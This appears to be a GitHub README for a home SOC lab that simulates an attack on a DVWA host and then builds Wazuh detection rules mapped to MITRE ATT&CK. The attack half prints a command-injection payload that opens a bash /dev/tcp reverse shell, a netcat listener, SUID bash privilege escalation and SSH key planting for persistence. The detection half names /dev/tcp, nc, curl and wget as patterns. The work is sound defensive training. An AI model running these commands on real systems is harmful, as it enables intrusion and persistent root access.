## Operation Watering Hole: End-to-End Detection Engineering

A simulated attack chain demonstrating Linux endpoint detection via Wazuh FIM and auditd, mapped to MITRE ATT&CK.

## Threat Scenario

| Phase | Technique | MITRE ID |
|-------|-----------|----------|
| Initial Access | Command Injection | T1059 |
| Execution | Reverse Shell via bash `/dev/tcp` | T1059 |
| Privilege Escalation | SUID Binary Abuse | T1548 |
| Persistence | SSH Public Key Planting | T1098.004 |


### Detection Coverage
This repository implements detection logic for each phase using:
- **Wazuh** for real-time endpoint telemetry (Sysmon integration)
- **MITRE ATT&CK** mapping for threat-informed prioritization

### Validation
Every rule was tested against live events in a Proxmox-based SOC lab
with VLAN-segmented networks (VLAN 10 internal, VLAN 30 DMZ).
---

## Initial Access: DVWA Command Injection

**Target:** `http://10.0.0.103/dvwa/vulnerabilities/exec/`  
**Security Level:** Low  

### Payload

```bash
|| bash -c 'bash -i &gt;& /dev/tcp/10.0.0.50/1234 0&gt;&1'

```
![commandinjection.png](https://github.com/Pahoeh0e/SOC_Home_Lab/blob/main/Operations/Screenshots/dvwa-command-injection.png)

Then on the attacker:

``` bash
nc -lvp 1234

```
![listener.png](https://github.com/Pahoeh0e/SOC_Home_Lab/blob/main/Operations/Screenshots/nc-lvp-listener-www-data-access.png)


### Bash shell Upgrade 
Initial reverse shell lacked TTY. Upgrade via:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
(Ctrl+Z to background)
```bash
stty raw -echo; fg
```
![upgradingshell.png](https://github.com/Pahoeh0e/SOC_Home_Lab/blob/main/Operations/Screenshots/upgrading-shell-www-data.png)


## Privilege Escalation
After Initial Access find out what privileges the user has via:

```bash
whoami
id
cat /etc/passwd
sudo su
cd /root

```

![catpasswd.png](https://github.com/Pahoeh0e/SOC_Home_Lab/blob/main/Operations/Screenshots/www-data-cat-etc-passwd.png)


### Exploiting misconfiguration
DVWA runs as www-data with /usr/sbin/nologin. To simulate the full attack chain create a misconfiguration as root, a SUID bash binary on the victim host, so the attacker can exploit to gain root privileges:

``` bash
cp /bin/bash /usr/local/bin/suidbash
chmod u+s /usr/local/bin/suidbash
```

![misconfiguration.png](https://github.com/Pahoeh0e/SOC_Home_Lab/blob/main/Operations/Screenshots/bash-shell-suid-victim.png)

From reverse shell:

```bash
/usr/local/bin/suidbash -p -c "whoami; id"
```

![whoamiroot.png](https://github.com/Pahoeh0e/SOC_Home_Lab/blob/main/Operations/Screenshots/www-data-suid-vulnerability-whoami.png)



### Persistence
With privilege escalation, plant SSH public key for persistence:

```bash
/usr/local/bin/suidbash -p -c "echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAI... attacker_key" >> /root/.ssh/authorized_keys"
```
![exploitsuid.png](https://github.com/Pahoeh0e/SOC_Home_Lab/blob/main/Operations/Screenshots/suid-persistence-ssh-authorized-keys.png)

> **Note:** The text looks skewed and jumbled but it initialled showed the ssh key to be inside the /.ssh/authorized_keys directory

Verify from attacker host:
``` bash
ssh -i ~/.ssh/pivot_key root@10.0.0.103

```



## Detection Coverage

### Wazuh Configuration

#### Step 1: Enable FIM for .ssh Directories
Edit /var/ossec/etc/ossec.conf on the Wazuh agent:
``` xml
<syscheck>
  <directories check_all="yes" report_changes="yes" tags="ssh_keys">/home/*/.ssh</directories>
  <directories check_all="yes" report_changes="yes" tags="ssh_keys">/root/.ssh</directories>
  <frequency>300</frequency>
</syscheck>
```
![ossecssh.png](https://github.com/Pahoeh0e/SOC_Home_Lab/blob/main/Operations/Screenshots/Screenshot%20from%202026-09-01%2012-46-39.png)

#### Step 2: Add the Apache2 logs to the Wazuh Agent
Edit /var/ossec/etc/ossec.conf on the Wazuh agent:
``` xml
<localfile>
  <log_format>apache</log_format>
  <location>/var/log/apache2/error.log</location>
</localfile>
<localfile>
  <log_format>apache</log_format>
  <location>/var/log/apache2/access.log</location>
</localfile>
```

![ossecapache](https://github.com/Pahoeh0e/SOC_Home_Lab/blob/main/Operations/Screenshots/Screenshot%20from%202026-09-01%2012-49-57.png)

Restart the agent:
``` bash
systemctl restart wazuh-agent
```

#### Step 3: Add Custom Rules

For all custom rules view the [Custom-Detection-Rules](https://github.com/Pahoeh0e/SOC_Home_Lab/blob/main/Custom-Detection-Rules.md) section.


Add these to /var/ossec/etc/rules/local_rules.xml on the Wazuh manager:

### Immediate Detection (Execution Phase)
**Wazuh Rule 100600** (Web server user spawned shell) fires immediately upon reverse shell execution, detecting:
- executing `/bin/bash` by www-data
- Apache-owned process spawning interactive shell

**Alert Level:** 12  
**Event:** Sysmon 1   
**MITRE:** T1059, T1505.003
---

### Network Callback Detection
**Wazuh Rule 100601** (Reverse shell callback) fires when the spawned shell includes network redirection patterns, detecting:
- `/dev/tcp/ bash` pseudo-device usage
- `nc, curl, wget` in command context

**Alert Level:** 14
**Event:** Sysmon 1
**MITRE:** T1059, T1071


### Persistence Detection
**Wazuh Rule 100602** (SSH key persistence) fires when authorized_keys is modified via FIM, detecting:
- New public key appended to authorized_keys
- .ssh directory permission changes


**Alert Level:** 14 
**Event:** syscheck (FIM) 
**MITRE:** T1098.004, T1021.004


## Kill Chain Timeline

| Time | MITRE ID | Phase | Detection |
|------|----------|-------|-----------|

| T+0s   │ 100600 │ Execution      │ www-data spawns bash |
| T+0s   │ 100601 │ Execution      │ /dev/tcp callback detected |
| T+30s  │ 100602 │ Persistence    │ /root/.ssh/authorized_keys modified |
